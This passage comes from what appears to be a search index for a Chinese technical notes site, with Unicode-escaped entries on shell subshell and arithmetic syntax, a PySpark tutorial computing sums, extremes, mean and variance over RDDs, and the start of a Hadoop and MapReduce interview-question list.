A \u4e2d\u5207\u6362\u6587\u4ef6\u5939\u4e0d\u4f1a\u5f71\u54cd\u5f53\u524d shell \u5de5\u4f5c\u8def\u5f84\u3002 (cd .. ; ls) \u8fd9\u6761\u547d\u4ee4\u4f1a\u8fd4\u56de\u4e0a\u5c42\u76ee\u5f55\u7684\u5185\u5bb9\uff0c\u4f46\u5de5\u4f5c\u8def\u5f84\u4ecd\u7136\u5728\u5f53\u524d\u76ee\u5f55\u3002 Command A $(Command B) \u8868\u793a\u8fd4\u56de\u547d\u4ee4 B \u7684\u7ed3\u679c\uff0c\u5e76\u5c06\u7ed3\u679c\u4f5c\u4e3a\u547d\u4ee4 A \u7684\u53c2\u6570\u7ee7\u7eed\u6267\u884c\u3002 $(echo echo) B \u8f93\u51fa\u4e3a B \u3002 echo A $(echo B) \u8f93\u51fa\u4e3a A B \u3002","title":"4.1. \u5b50\u547d\u4ee4\u7b26\u53f7 ()"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Linux/1.%E7%AE%A1%E9%81%93%E4%B8%8E%E8%BF%9E%E6%8E%A5%E7%AC%A6%E5%8F%B7/#42","text":"((Calculation A)) \u8ba1\u7b97\u8868\u8fbe\u5f0f A \u7684\u503c\u3002 \u5982\u679c\u8981\u4f5c\u4e3a\u53d8\u91cf\u7684\u8bdd\uff0c\u9700\u8981\u52a0\u4e0a $ \u3002\u5982 echo $((3+2)) \uff0c\u8f93\u51fa\u4e3a 5 \u3002 \u5e38\u4e0e if \u548c for \u547d\u4ee4\u914d\u5408\u4f7f\u7528\u3002 if ((3>2)) echo true for ((i=1;i<=16;i++));do echo $i; done \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"4.2. \u8868\u8fbe\u5f0f\u8ba1\u7b97\u7b26\u53f7 (())"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Spark/1.%E5%9D%87%E5%80%BC_%E6%9C%80%E5%80%BC_%E6%96%B9%E5%B7%AE/","text":"\u4f7f\u7528 PySpark \u6c42\u5747\u503c\u3001\u6700\u503c\u4e0e\u65b9\u5dee # \u76ee\u5f55 # \u4f7f\u7528 PySpark \u6c42\u5747\u503c\u3001\u6700\u503c\u4e0e\u65b9\u5dee \u76ee\u5f55 1. \u80cc\u666f 2. \u4f7f\u7528IPython\u542f\u52a8PySpark 3. \u521b\u5efa\u6570\u636e 4. \u6240\u6709\u5143\u7d20\u7684\u603b\u548c 5. \u4e0d\u540c\u5206\u533a\u6570\u91cf\u60c5\u51b5\u4e0bRDD\u7684\u8ba1\u7b97 6. \u6700\u503c 7. \u5747\u503c 8. \u65b9\u5dee 1. \u80cc\u666f # \u6700\u8fd1\u9700\u8981\u5b66\u4e60Spark\u7684\u76f8\u5173\u77e5\u8bc6\uff0c\u4e8e\u662f\u6211\u9009\u62e9\u4ece\u7b80\u5355\u7684\u7edf\u8ba1\u6570\u503c\u5f00\u59cb\u5b66\u4e60\uff0c\u5199\u4e00\u7bc7\u7b14\u8bb0\u8bb0\u5f55\u5b66\u4e60\u8fc7\u7a0b\u3002 \u5b8c\u6574\u4ee3\u7801\u4e0e\u8fd0\u884c\u7ed3\u679c\u8bf7\u53c2\u8003 Github \u3002 2. \u4f7f\u7528IPython\u542f\u52a8PySpark # \u5728\u547d\u4ee4\u884c\u8f93\u5165\u4e0b\u9762\u7684\u547d\u4ee4\uff0c\u5c31\u53ef\u4ee5\u4f7f\u7528 IPython \u542f\u52a8 Spark \u3002 PYSPARK_DRIVER_PYTHON=ipython pyspark \u4f7f\u7528 Jupyter Notebook \u542f\u52a8 Spark \u3002 PYSPARK_DRIVER_PYTHON=jupyter PYSPARK_DRIVER_PYTHON_OPTS=\"notebook\" pyspark \u4e5f\u53ef\u4ee5\u5148\u542f\u52a8 Jupyter Notebook \uff0c\u7136\u540e\u518d\u521b\u5efa Spark \u5e94\u7528\u3002 from pyspark import SparkConf, SparkContext # local[*] \u8868\u793a\u6700\u5927\u7ebf\u7a0b\u6570\uff0c\u4e00\u822c\u4e3aCPU\u6838\u6570 conf = SparkConf().setMaster(\"local[*]\").setAppName('My App') sc = SparkContext(conf = conf) \u542f\u52a8 Spark \u4ee5\u540e\uff0c\u53ef\u4ee5\u5728\u6d4f\u89c8\u5668\u8bbf\u95ee localhost:4040 \u8fdb\u5165 Saprk UI \u53ef\u89c6\u5316\u754c\u9762\u3002 3. \u521b\u5efa\u6570\u636e # \u4ece\u6587\u4ef6\u521b\u5efa\u6570\u636e\u3002 lines = sc.textFile(\"README.md\") # \u7edf\u8ba1\u5143\u7d20\u4e2a\u6570 lines.count() # \u663e\u793a\u7b2c\u4e00\u4e2a\u5143\u7d20\uff0c\u4e5f\u5c31\u662f README.md \u4e2d\u7684\u7b2c\u4e00\u884c lines.first() \u4ece\u5185\u5b58\u521b\u5efa\u6570\u636e\u3002 ## \u4ece\u5185\u5b58\u521b\u5efa\u4e00\u4e2aRDD nums = sc.parallelize([1, 2, 3, 4, 5]) 4. \u6240\u6709\u5143\u7d20\u7684\u603b\u548c # \u5982\u679cRDD\u4e2d\u6bcf\u4e2a\u5143\u7d20\u662f\u5355\u4e2a\u503c\uff0c\u5219\u901a\u8fc7 reduce(func(x, y)) \u4f20\u5165\u8f93\u5165\u53c2\u6570\u4e3a 2 \u4e2a\u503c\u7684\u51fd\u6570\u65f6\uff0c\u5b83\u4f1a\u88ab\u987a\u5e8f\u4f5c\u7528\u5728\u4e0d\u540c\u7684\u5206\u533a\u5f53\u4e2d\u3002\u8ba1\u7b97\u5404\u5206\u533a\u7684\u7ed3\u679c [y1, y2] \u4ee5\u540e\uff0c\u518d\u901a\u8fc7 func(y1, y2) \u8fde\u63a5\u3002 # \u6c42\u548c nums.reduce(lambda x, y: x + y) # 15 # \u51cf\u6cd5\u8ba1\u7b97\uff0c5\u4e2a\u6570\u7684\u8ba1\u7b97\u987a\u5e8f\u4e3a (1 - 2 - 3) - (4 - 5) sc.parallelize([1, 2, 3, 4, 5]).reduce(lambda x, y: x - y) # -3 5. \u4e0d\u540c\u5206\u533a\u6570\u91cf\u60c5\u51b5\u4e0bRDD\u7684\u8ba1\u7b97 # RDD\u7684\u5206\u533a\u6570\u91cf\u4f1a\u5f71\u54cd\u5230\u8ba1\u7b97\u7684\u5e76\u884c\u6027\u3002 \u6211\u7684\u786c\u4ef6\u914d\u7f6e\u4fe1\u606f\u5982\u4e0b\uff1a \u578b\u53f7\u540d\u79f0\uff1a MacBook Pro \u578b\u53f7\u6807\u8bc6\u7b26\uff1a MacBookPro12,1 \u5904\u7406\u5668\u540d\u79f0\uff1a Dual-Core Intel Core i5 \u5904\u7406\u5668\u901f\u5ea6\uff1a 2.7 GHz \u5904\u7406\u5668\u6570\u76ee\uff1a 1 \u6838\u603b\u6570\uff1a 2 \u8d85\u7ebf\u7a0b\u6280\u672f\uff1a \u5df2\u542f\u7528 \u5185\u5b58\uff1a 8 GB \u9996\u5148\uff0c\u521b\u5efa\u4e00\u4e2a\u5927\u4e00\u4e9b\u7684\u6570\u636e\u8fdb\u884c\u6d4b\u8bd5\u3002 # \u5148\u521b\u5efa\u4e00\u4e2a\u6570\u7ec4 array = [i for i in range(int(1e7))] len(array) # 10000000 \u521b\u5efa\u4e0d\u540c\u5206\u533a\u5927\u5c0f\u7684RDD\u3002 # \u521b\u5efa\u5355\u4e2a\u5206\u533aRDD rdd1 = sc.parallelize(array, 1) # \u521b\u5efa\u4e24\u4e2a\u5206\u533a\u7684RDD rdd2 = sc.parallelize(array, 2) # \u521b\u5efa\u9ed8\u8ba4\u6570\u91cf\u5206\u533a\u7684RDD\uff0c\u5728\u6211\u7684\u673a\u5668\u4e0a\u9ed8\u8ba4\u4e3a4 rdd3 = sc.parallelize(array) \u5355\u4e2a\u5206\u533a\u7684 RDD \u8fdb\u884c reduce \u8fd0\u7b97\u65f6\uff0c\u53ea\u6709\u5355\u4e2a Task \u88ab\u542f\u52a8\uff0c\u5355\u7ebf\u7a0b\u8fd0\u884c\u3002 # \u5355\u7ebf\u7a0b\u8fd0\u884c %timeit rdd1.reduce(lambda x, y: x - y) # 3.52 s \u00b1 261 ms per loop (mean \u00b1 std. dev. of 7 runs, 1 loop each) \u4e24\u4e2a\u5206\u533a\u7684 RDD \u8fdb\u884c reduce \u8fd0\u7b97\u65f6\uff0c\u4e24\u4e2a Task \u88ab\u542f\u52a8\uff0c\u53cc\u7ebf\u7a0b\u8fd0\u884c\u3002 # \u53cc\u7ebf\u7a0b\u8fd0\u884c %timeit rdd2.reduce(lambda x, y: x - y) # 1.86 s \u00b1 88.6 ms per loop (mean \u00b1 std. dev. of 7 runs, 1 loop each) \u6211\u7684\u673a\u5668\u5728\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u4e3a4\u5206\u533a\uff0c4\u7ebf\u7a0b\u3002 # \u56db\u7ebf\u7a0b\u8fd0\u884c %timeit rdd3.reduce(lambda x, y: x - y) # 2.39 s \u00b1 186 ms per loop (mean \u00b1 std. dev. of 7 runs, 1 loop each) 6. \u6700\u503c # # \u6700\u5927\u503c nums.reduce(lambda x, y: max(x, y)) # 5 # \u6700\u5c0f\u503c nums.reduce(lambda x, y: min(x, y)) # 1 7. \u5747\u503c # avg = nums.reduce(lambda x, y: x + y) / nums.count() avg # 3.0 8. \u65b9\u5dee # nums.map(lambda x : x - avg).map(lambda x: x * x).reduce(lambda x, y: x + y) # 10.0 \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"1.\u5747\u503c \u6700\u503c \u65b9\u5dee"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Spark/1.%E5%9D%87%E5%80%BC_%E6%9C%80%E5%80%BC_%E6%96%B9%E5%B7%AE/#pyspark","text":"","title":"\u4f7f\u7528 PySpark \u6c42\u5747\u503c\u3001\u6700\u503c\u4e0e\u65b9\u5dee"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Spark/1.%E5%9D%87%E5%80%BC_%E6%9C%80%E5%80%BC_%E6%96%B9%E5%B7%AE/#_1","text":"\u4f7f\u7528 PySpark \u6c42\u5747\u503c\u3001\u6700\u503c\u4e0e\u65b9\u5dee \u76ee\u5f55 1. \u80cc\u666f 2. \u4f7f\u7528IPython\u542f\u52a8PySpark 3. \u521b\u5efa\u6570\u636e 4. \u6240\u6709\u5143\u7d20\u7684\u603b\u548c 5. \u4e0d\u540c\u5206\u533a\u6570\u91cf\u60c5\u51b5\u4e0bRDD\u7684\u8ba1\u7b97 6. \u6700\u503c 7. \u5747\u503c 8. \u65b9\u5dee","title":"\u76ee\u5f55"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Spark/1.%E5%9D%87%E5%80%BC_%E6%9C%80%E5%80%BC_%E6%96%B9%E5%B7%AE/#1","text":"\u6700\u8fd1\u9700\u8981\u5b66\u4e60Spark\u7684\u76f8\u5173\u77e5\u8bc6\uff0c\u4e8e\u662f\u6211\u9009\u62e9\u4ece\u7b80\u5355\u7684\u7edf\u8ba1\u6570\u503c\u5f00\u59cb\u5b66\u4e60\uff0c\u5199\u4e00\u7bc7\u7b14\u8bb0\u8bb0\u5f55\u5b66\u4e60\u8fc7\u7a0b\u3002 \u5b8c\u6574\u4ee3\u7801\u4e0e\u8fd0\u884c\u7ed3\u679c\u8bf7\u53c2\u8003 Github \u3002","title":"1. \u80cc\u666f"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Spark/1.%E5%9D%87%E5%80%BC_%E6%9C%80%E5%80%BC_%E6%96%B9%E5%B7%AE/#2-ipythonpyspark","text":"\u5728\u547d\u4ee4\u884c\u8f93\u5165\u4e0b\u9762\u7684\u547d\u4ee4\uff0c\u5c31\u53ef\u4ee5\u4f7f\u7528 IPython \u542f\u52a8 Spark \u3002 PYSPARK_DRIVER_PYTHON=ipython pyspark \u4f7f\u7528 Jupyter Notebook \u542f\u52a8 Spark \u3002 PYSPARK_DRIVER_PYTHON=jupyter PYSPARK_DRIVER_PYTHON_OPTS=\"notebook\" pyspark \u4e5f\u53ef\u4ee5\u5148\u542f\u52a8 Jupyter Notebook \uff0c\u7136\u540e\u518d\u521b\u5efa Spark \u5e94\u7528\u3002 from pyspark import SparkConf, SparkContext # local[*] \u8868\u793a\u6700\u5927\u7ebf\u7a0b\u6570\uff0c\u4e00\u822c\u4e3aCPU\u6838\u6570 conf = SparkConf().setMaster(\"local[*]\").setAppName('My App') sc = SparkContext(conf = conf) \u542f\u52a8 Spark \u4ee5\u540e\uff0c\u53ef\u4ee5\u5728\u6d4f\u89c8\u5668\u8bbf\u95ee localhost:4040 \u8fdb\u5165 Saprk UI \u53ef\u89c6\u5316\u754c\u9762\u3002","title":"2. \u4f7f\u7528IPython\u542f\u52a8PySpark"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Spark/1.%E5%9D%87%E5%80%BC_%E6%9C%80%E5%80%BC_%E6%96%B9%E5%B7%AE/#3","text":"\u4ece\u6587\u4ef6\u521b\u5efa\u6570\u636e\u3002 lines = sc.textFile(\"README.md\") # \u7edf\u8ba1\u5143\u7d20\u4e2a\u6570 lines.count() # \u663e\u793a\u7b2c\u4e00\u4e2a\u5143\u7d20\uff0c\u4e5f\u5c31\u662f README.md \u4e2d\u7684\u7b2c\u4e00\u884c lines.first() \u4ece\u5185\u5b58\u521b\u5efa\u6570\u636e\u3002 ## \u4ece\u5185\u5b58\u521b\u5efa\u4e00\u4e2aRDD nums = sc.parallelize([1, 2, 3, 4, 5])","title":"3. \u521b\u5efa\u6570\u636e"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Spark/1.%E5%9D%87%E5%80%BC_%E6%9C%80%E5%80%BC_%E6%96%B9%E5%B7%AE/#4","text":"\u5982\u679cRDD\u4e2d\u6bcf\u4e2a\u5143\u7d20\u662f\u5355\u4e2a\u503c\uff0c\u5219\u901a\u8fc7 reduce(func(x, y)) \u4f20\u5165\u8f93\u5165\u53c2\u6570\u4e3a 2 \u4e2a\u503c\u7684\u51fd\u6570\u65f6\uff0c\u5b83\u4f1a\u88ab\u987a\u5e8f\u4f5c\u7528\u5728\u4e0d\u540c\u7684\u5206\u533a\u5f53\u4e2d\u3002\u8ba1\u7b97\u5404\u5206\u533a\u7684\u7ed3\u679c [y1, y2] \u4ee5\u540e\uff0c\u518d\u901a\u8fc7 func(y1, y2) \u8fde\u63a5\u3002 # \u6c42\u548c nums.reduce(lambda x, y: x + y) # 15 # \u51cf\u6cd5\u8ba1\u7b97\uff0c5\u4e2a\u6570\u7684\u8ba1\u7b97\u987a\u5e8f\u4e3a (1 - 2 - 3) - (4 - 5) sc.parallelize([1, 2, 3, 4, 5]).reduce(lambda x, y: x - y) # -3","title":"4. \u6240\u6709\u5143\u7d20\u7684\u603b\u548c"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Spark/1.%E5%9D%87%E5%80%BC_%E6%9C%80%E5%80%BC_%E6%96%B9%E5%B7%AE/#5-rdd","text":"RDD\u7684\u5206\u533a\u6570\u91cf\u4f1a\u5f71\u54cd\u5230\u8ba1\u7b97\u7684\u5e76\u884c\u6027\u3002 \u6211\u7684\u786c\u4ef6\u914d\u7f6e\u4fe1\u606f\u5982\u4e0b\uff1a \u578b\u53f7\u540d\u79f0\uff1a MacBook Pro \u578b\u53f7\u6807\u8bc6\u7b26\uff1a MacBookPro12,1 \u5904\u7406\u5668\u540d\u79f0\uff1a Dual-Core Intel Core i5 \u5904\u7406\u5668\u901f\u5ea6\uff1a 2.7 GHz \u5904\u7406\u5668\u6570\u76ee\uff1a 1 \u6838\u603b\u6570\uff1a 2 \u8d85\u7ebf\u7a0b\u6280\u672f\uff1a \u5df2\u542f\u7528 \u5185\u5b58\uff1a 8 GB \u9996\u5148\uff0c\u521b\u5efa\u4e00\u4e2a\u5927\u4e00\u4e9b\u7684\u6570\u636e\u8fdb\u884c\u6d4b\u8bd5\u3002 # \u5148\u521b\u5efa\u4e00\u4e2a\u6570\u7ec4 array = [i for i in range(int(1e7))] len(array) # 10000000 \u521b\u5efa\u4e0d\u540c\u5206\u533a\u5927\u5c0f\u7684RDD\u3002 # \u521b\u5efa\u5355\u4e2a\u5206\u533aRDD rdd1 = sc.parallelize(array, 1) # \u521b\u5efa\u4e24\u4e2a\u5206\u533a\u7684RDD rdd2 = sc.parallelize(array, 2) # \u521b\u5efa\u9ed8\u8ba4\u6570\u91cf\u5206\u533a\u7684RDD\uff0c\u5728\u6211\u7684\u673a\u5668\u4e0a\u9ed8\u8ba4\u4e3a4 rdd3 = sc.parallelize(array) \u5355\u4e2a\u5206\u533a\u7684 RDD \u8fdb\u884c reduce \u8fd0\u7b97\u65f6\uff0c\u53ea\u6709\u5355\u4e2a Task \u88ab\u542f\u52a8\uff0c\u5355\u7ebf\u7a0b\u8fd0\u884c\u3002 # \u5355\u7ebf\u7a0b\u8fd0\u884c %timeit rdd1.reduce(lambda x, y: x - y) # 3.52 s \u00b1 261 ms per loop (mean \u00b1 std. dev. of 7 runs, 1 loop each) \u4e24\u4e2a\u5206\u533a\u7684 RDD \u8fdb\u884c reduce \u8fd0\u7b97\u65f6\uff0c\u4e24\u4e2a Task \u88ab\u542f\u52a8\uff0c\u53cc\u7ebf\u7a0b\u8fd0\u884c\u3002 # \u53cc\u7ebf\u7a0b\u8fd0\u884c %timeit rdd2.reduce(lambda x, y: x - y) # 1.86 s \u00b1 88.6 ms per loop (mean \u00b1 std. dev. of 7 runs, 1 loop each) \u6211\u7684\u673a\u5668\u5728\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u4e3a4\u5206\u533a\uff0c4\u7ebf\u7a0b\u3002 # \u56db\u7ebf\u7a0b\u8fd0\u884c %timeit rdd3.reduce(lambda x, y: x - y) # 2.39 s \u00b1 186 ms per loop (mean \u00b1 std. dev. of 7 runs, 1 loop each)","title":"5. \u4e0d\u540c\u5206\u533a\u6570\u91cf\u60c5\u51b5\u4e0bRDD\u7684\u8ba1\u7b97"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Spark/1.%E5%9D%87%E5%80%BC_%E6%9C%80%E5%80%BC_%E6%96%B9%E5%B7%AE/#6","text":"# \u6700\u5927\u503c nums.reduce(lambda x, y: max(x, y)) # 5 # \u6700\u5c0f\u503c nums.reduce(lambda x, y: min(x, y)) # 1","title":"6. \u6700\u503c"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Spark/1.%E5%9D%87%E5%80%BC_%E6%9C%80%E5%80%BC_%E6%96%B9%E5%B7%AE/#7","text":"avg = nums.reduce(lambda x, y: x + y) / nums.count() avg # 3.0","title":"7. \u5747\u503c"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Spark/1.%E5%9D%87%E5%80%BC_%E6%9C%80%E5%80%BC_%E6%96%B9%E5%B7%AE/#8","text":"nums.map(lambda x : x - avg).map(lambda x: x * x).reduce(lambda x, y: x + y) # 10.0 \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"8. \u65b9\u5dee"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Spark/2.%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%A0%94%E5%8F%91%E5%B7%A5%E7%A8%8B%E5%B8%88%E9%9D%A2%E8%AF%95%E9%A2%98%E6%95%B4%E7%90%86/","text":"\u5927\u6570\u636e\u7814\u53d1\u5de5\u7a0b\u5e08\u9762\u8bd5\u9898\u6574\u7406 # \u76ee\u5f55 # \u5927\u6570\u636e\u7814\u53d1\u5de5\u7a0b\u5e08\u9762\u8bd5\u9898\u6574\u7406 \u76ee\u5f55 1. \u80cc\u666f 2. Hadoop 2.1. \u4ecb\u7ecdMapReduce 2.2. MapReduce\u4e2d\u95f4\u7684Combine\u7684\u4f5c\u7528 2.3. MapReduce\u51fa\u73b0\u6570\u636e\u503e\u659c\u600e\u4e48\u89e3\u51b3 2.4. \u4ecb\u7ecdYarn 2.5. \u4ecb\u7ecdZookeeper 3. Spark 3.1. Spark\u7684\u5bbd\u7a84\u4f9d\u8d56 3.2. Spark\u7684Stage\u662f\u600e\u4e48\u5212\u5206\u7684\uff0c\u5982\u4f55\u4f18\u5316 3.3. \u4ecb\u7ecdSpark\u7684RDD 3.4. Spark\u7684TaskScheduler\u662f\u600e\u4e48\u5206\u914dTask\u7684 3.5. Spark\u54ea\u4e9b\u90e8\u5206\u53ef\u4ee5\u4f18\u5316 3.6. Spark\u7684Shuffle\u8fc7\u7a0b 3.7. Spark\u9047\u5230\u6570\u636e\u503e\u659c\u600e\u4e48\u529e 3.8. Spark\u548cHadoop\u7684\u533a\u522b 4. Hive 4.1. Hive\u7684\u4f5c\u7528 4.2. Hive SQL\u4f18\u5316 4.3. Hive SQL\u4e2d\u7684Join\u4f18\u5316\u65b9\u6cd5 5. \u53c2\u8003\u4e66\u7c4d 1. \u80cc\u666f # \u6700\u8fd1\u6574\u7406\u4e86\u5927\u6570\u636e\u7814\u53d1\u5de5\u7a0b\u5e08\u7684\u4e00\u4e9b\u9762\u8bd5\u9898\uff0c\u4f46\u5728\u9762\u8bd5\u7684\u8fc7\u7a0b\u4e2d\u88ab\u5361\u5728\u4e86\u7b97\u6cd5\u9898\u4e0a\uff0c\u9762\u8bd5\u5b98\u5efa\u8bae\u81f3\u5c11\u8981\u628aLeetCode\u524d400\u9898\u505a\u4f1a\uff0c\u770b\u6765\u8fd8\u662f\u5f97\u4e0d\u65ad\u63d0\u9ad8\u81ea\u5df1\u7684\u7b97\u6cd5\u80fd\u529b\u3002 \u4e4b\u524d\u6574\u7406\u7684\u9762\u8bd5\u9898\u5728\u8fd9\u91cc\u5206\u4eab\u4e00\u4e0b\u3002\u5927\u90e8\u5206\u53c2\u8003\u81ea\u4e66\u7c4d\uff0c\u5728\u6587\u7ae0\u6700\u540e\u5217\u51fa\u4e86\u53c2\u8003\u4e66\u76ee\uff0c\u6709\u4e00\u4e9b\u4e5f\u53c2\u8003\u81ea\u535a\u5ba2\uff0c\u5728\u5185\u5bb9\u4e0b\u65b9\u8fdb\u884c\u4e86\u6807\u6ce8\u3002 \u9898\u76ee\u6765\u6e90\uff1a \u77e5\u4e4e\u56de\u7b54\uff1a\u5b57\u8282\u8df3\u52a8\u5927\u6570\u636e\u7814\u53d1\u9762\u8bd5\u4e00\u822c\u4f1a\u95ee\u4ec0\u4e48\u65b9\u5411 \u3002 \u95ee\u9898\u8303\u56f4\u5305\u62ec Hadoop \u3001 Saprk \u3001\u8ba1\u7b97\u673a\u4e13\u4e1a\u8bfe\u3001\u6570\u636e\u5e93\u8fd8\u6709\u7b97\u6cd5\u9898\uff0c\u8fd9\u91cc\u4e3b\u8981\u6574\u7406\u4e86 Hadoop \u3001 Saprk \u7684\u5185\u5bb9\u3002 \u5927\u6570\u636e\u5165\u95e8\u63a8\u8350\u5b66\u4e60 \u300a\u5927\u89c4\u6a21\u6570\u636e\u5904\u7406\u5b9e\u6218\u300b \u8bfe\u7a0b\u3002 2. Hadoop # 2.1. \u4ecb\u7ecdMapReduce # MapReduce \u662f\u4e3a\u4e86\u8fdb\u884c\u5927\u89c4\u6a21\u6570\u636e\u5904\u7406\u4e0e\u8ba1\u7b97\u800c\u5b9e\u73b0\u7684\u4e00\u4e2a\u6a21\u578b\u3002 MapReduce \u7684\u6267\u884c\u8fc7\u7a0b\u53ef\u4ee5\u5206\u4e3a\u4e94\u4e2a\u9636\u6bb5\u3002 \u9996\u5148\u662f Split \u9636\u6bb5\uff0c\u5c06\u6570\u636e\u5207\u5206\u6210\u591a\u4efd\uff0c\u53d1\u9001\u5230\u5404\u4e2a\u8ba1\u7b97\u8282\u70b9\u4e0a\u3002 \u7136\u540e\u662f Map \u9636\u6bb5\uff0c Map \u64cd\u4f5c\u901a\u8fc7\u4f20\u5165\u4e00\u4e2a\u51fd\u6570\uff0c\u5c06\u8fd9\u4e2a\u51fd\u6570\u4f5c\u7528\u4e8e\u6bcf\u4e2a\u5b58\u50a8\u7684\u952e\u503c\u5bf9 \uff08key-value\uff09 \u4e0a\uff0c\u5f62\u6210\u4e2d\u95f4\u7ed3\u679c\u3002 \u63a5\u4e0b\u6765\u662f Shuffle \uff08\u6d17\u724c\uff09\u9636\u6bb5\u3002 Shuffle \u9636\u6bb5\u7531 Partition\u3001Sort\u548cCombine \u4e09\u4e2a\u64cd\u4f5c\u7ec4\u6210\uff0c Partition \uff08\u5206\u533a\uff09\u64cd\u4f5c\u5c06\u4e2d\u95f4\u7ed3\u679c\u6309\u7167\u7ed9\u5b9a\u7684\u89c4\u5219\u91cd\u65b0\u5206\u5272\uff0c\u9ed8\u8ba4\u662f\u6309\u7167 key\u7684hash\u503c mod reduce\u4efb\u52a1\u6570\u91cf \u8fdb\u884c\u5206\u533a\u3002\u7136\u540e\u662f Sort \u8fc7\u7a0b\uff0c Sort \uff08\u6392\u5e8f\uff09\u64cd\u4f5c\u5c06\u6bcf\u4e2a\u5206\u533a\u5185\u7684\u6570\u636e\u6309\u7167\u952e\uff08key\uff09\u7684\u5b57\u6bcd\u987a\u5e8f\u8fdb\u884c\u6392\u5e8f\u3002 Shuffle \u9636\u6bb5\u7684\u6700\u540e\u8fd8\u5b58\u5728 Combine \u8fc7\u7a0b\uff0c Combine \uff08\u5408\u5e76\uff09\u64cd\u4f5c\u53ef\u4ee5\u770b\u4f5c\u662f\u4e00\u4e2a\u5c0f\u578b\u7684 Reduce \u64cd\u4f5c\uff0c\u53ef\u4ee5\u4f7f\u7528\u7528\u6237\u5b9a\u4e49\u7684 Combiner \u51fd\u6570\u5bf9\u6570\u636e\u8fdb\u884c\u521d\u6b65\u5408\u5e76\uff0c\u51cf\u5c0f\u6570\u636e\u7684\u89c4\u6a21\uff0c\u964d\u4f4e I/O \u548c\u7f51\u7edc\u4f20\u8f93\u7684\u6210\u672c\u3002\u6700\u540e\u5c06\u6570\u636e\u4f20\u8f93\u7ed9 Reduce \u4efb\u52a1\u3002 \u7b2c\u56db\u4e2a\u9636\u6bb5\u662f Reduce \u9636\u6bb5\u3002 Reduce \u4f7f\u7528\u4f20\u5165\u7684\u51fd\u6570\u5bf9\u4e2d\u95f4\u7ed3\u679c\u8fdb\u884c\u805a\u5408\u4e0e\u8fd0\u7b97\uff0c\u8f93\u51fa\u4e0b\u4e00\u6b65\u7684\u4e2d\u95f4\u7ed3\u679c\u6216\u8005\u6700\u7ec8\u7ed3\u679c\u3002 \u6700\u540e\u4e00\u4e2a\u9636\u6bb5\u5c31\u662f Output \u9636\u6bb5\u3002\u5c06\u5904\u7406\u5b8c\u6210\u7684\u6700\u7ec8\u7ed3\u679c\u8f93\u51fa\uff0c\u6216\u8005\u5c06\u7ed3\u679c\u5199\u5165\u6587\u4ef6\u4e2d\u3002 \u4e00\u4e2a\u5b8c\u6574\u7684\u5927\u6570\u636e\u5904\u7406\u7a0b\u5e8f\u53ef\u4ee5\u7531\u591a\u4e2a MapReduce \u8fc7\u7a0b\u7ec4\u6210\u3002 Hadoop \u6846\u67b6\u662f\u6bd4\u8f83\u6d41\u884c\u7684 MapReduce \u5f00\u6e90\u5b9e\u73b0\u3002 2.2. MapReduce\u4e2d\u95f4\u7684Combine\u7684\u4f5c\u7528 # Combine \uff08\u5408\u5e76\uff09\u64cd\u4f5c\u53ef\u4ee5\u770b\u4f5c\u662f\u4e00\u4e2a\u5c0f\u578b\u7684 Reduce \u64cd\u4f5c\uff0c\u53ef\u4ee5\u4f7f\u7528\u7528\u6237\u5b9a\u4e49\u7684 Combiner \u51fd\u6570\u5bf9\u6570\u636e\u8fdb\u884c\u521d\u6b65\u5408\u5e76\uff0c\u51cf\u5c0f\u6570\u636e\u7684\u89c4\u6a21\uff0c\u964d\u4f4e I/O 